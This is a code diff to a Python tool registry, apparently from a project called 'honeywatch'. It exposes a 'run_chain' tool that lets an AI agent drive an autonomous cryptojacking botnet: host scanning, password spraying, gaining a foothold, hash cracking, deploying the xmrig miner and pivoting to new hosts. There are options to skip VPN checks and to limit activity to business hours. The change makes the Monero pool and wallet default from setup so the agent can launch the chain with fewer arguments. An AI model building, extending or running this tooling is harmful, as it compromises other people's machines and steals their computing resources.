@@ -390,7 +390,7 @@ _TOOL_SPECS: list[dict[str, Any]] = [
     },
     {
         "name": "run_chain",
-        "description": "Run the autonomous cryptojacker chain: scan -> spray -> foothold -> hashcrack -> deploy xmrig -> pivot, looping on growth. Give it targets + pool/wallet and it drives the whole botnet.",
+        "description": "Run the autonomous cryptojacker chain: scan -> spray -> foothold -> hashcrack -> deploy xmrig -> pivot, looping on growth. Give it targets and it drives the whole botnet; pool/wallet default from `honeywatch setup`.",
         "parameters": {
             "type": "object",
             "properties": {
@@ -398,14 +398,13 @@ _TOOL_SPECS: list[dict[str, Any]] = [
                 "users": {"type": "string"},
                 "passwords": {"type": "string"},
                 "payload": {"type": "string", "description": "default xmrig"},
-                "pool": {"type": "string", "description": "mining pool URL (required for miner deploy)"},
-                "wallet": {"type": "string", "description": "wallet address (required for miner deploy)"},
+                "pool": {"type": "string", "description": "mining pool URL; defaults to the pool configured in `honeywatch setup`."},
+                "wallet": {"type": "string", "description": "Monero wallet address; defaults to the wallet configured in `honeywatch setup`."},
                 "hashcrack_wordlist": {"type": "string"},
                 "business_hours": {"type": "boolean"},
                 "max_rounds": {"type": "integer"},
                 "skip_vpn_check": {"type": "boolean"},
             },
-            "required": ["pool", "wallet"],
         },
     },
 ]
@@ -867,13 +866,38 @@ def _tool_run_chain(args: dict[str, Any], ctx: ToolContext) -> dict[str, Any]:
     from honeywatch.chain import ChainConfig, run_chain
 
     targets = [t.strip() for t in (args.get("targets") or "").split(",") if t.strip()]
+    payload_id = args.get("payload", "xmrig")
+    # The Monero wallet + pool are configured once during `honeywatch setup` and
+    # live in the agent setup store (ctx.agent_config). Default from there so the
+    # model can call run_chain without re-passing pool/wallet, and a
+    # setup-configured wallet actually reaches the chain's deploy phase. Explicit
+    # per-call args still win (same contract as the `deploy` tool). Without this,
+    # `honeywatch setup` was pointless for the chain -- botnet/run_chain demanded
+    # --pool/--wallet every single time even after you configured them once.
+    pool = args.get("pool") or ctx.agent_config.pool
+    wallet = args.get("wallet") or ctx.agent_config.wallet
+    worker = ctx.agent_config.worker
+    tls = ctx.agent_config.tls
+
+    if payload_id in {"xmrig", "xmrigcc"}:
+        missing = [k for k, v in (("pool", pool), ("wallet", wallet)) if not v]
+        if missing:
+            return {
+                "error": (
+                    f"miner deploy needs {' and '.join(missing)}; configure via "
+                    "set_wallet (or `honeywatch setup`) or pass them to run_chain."
+                )
+            }
+
     cfg = ChainConfig(
         targets=targets,
         users=[u.strip() for u in (args.get("users") or "").split(",") if u.strip()],
         passwords=[p.strip() for p in (args.get("passwords") or "").split(",") if p.strip()],
-        payload_id=args.get("payload", "xmrig"),
-        pool=args.get("pool", ""),
-        wallet=args.get("wallet", ""),
+        payload_id=payload_id,
+        pool=pool,
+        wallet=wallet,
+        worker=worker,
+        tls=tls,
         hashcrack_wordlist=args.get("hashcrack_wordlist", ""),
         business_hours=bool(args.get("business_hours", False)),
         max_rounds=int(args.get("max_rounds", 3)),
